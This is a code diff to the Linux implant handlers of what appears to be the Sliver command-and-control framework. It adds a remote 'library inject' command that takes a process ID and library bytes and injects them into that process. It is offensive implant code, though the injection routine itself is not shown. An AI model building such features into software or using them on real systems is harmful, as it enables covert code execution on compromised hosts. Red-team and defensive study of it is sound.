@@ -19,7 +19,14 @@ package handlers
 */
 
 import (
+	// {{if .Config.Debug}}
+	"log"
+	// {{end}}
+
+	"github.com/bishopfox/sliver/implant/sliver/taskrunner"
+	"github.com/bishopfox/sliver/protobuf/commonpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
+	"google.golang.org/protobuf/proto"
 )
 
 var (
@@ -48,6 +55,7 @@ var (
 
 		sliverpb.MsgReconnectIntervalReq: reconnectIntervalHandler,
 		sliverpb.MsgSSHCommandReq:        runSSHCommandHandler,
+		sliverpb.MsgLibInjectReq:         libInjectHandler,
 
 		// {{if .Config.WGc2Enabled}}
 		// Wireguard specific
@@ -71,4 +79,29 @@ func GetSystemHandlers() map[uint32]RPCHandler {
 // GetSystemPivotHandlers - Returns a map of the linux system handlers
 func GetSystemPivotHandlers() map[uint32]PivotHandler {
 	return linuxPivotHandlers
+}
+
+func libInjectHandler(data []byte, resp RPCResponse) {
+	injectReq := &sliverpb.LibInjectReq{}
+	err := proto.Unmarshal(data, injectReq)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("error decoding message: %s", err)
+		// {{end}}
+		return
+	}
+	err = taskrunner.LibTask(int(injectReq.Pid), injectReq.Data)
+
+	injectRes := sliverpb.LibInject{
+		Response: &commonpb.Response{},
+	}
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("failed to inject lib %s\n", err)
+		// {{end}}
+		injectRes.Response.Err = err.Error()
+	}
+	data, err = proto.Marshal(&injectRes)
+	resp(data, err)
+
 }
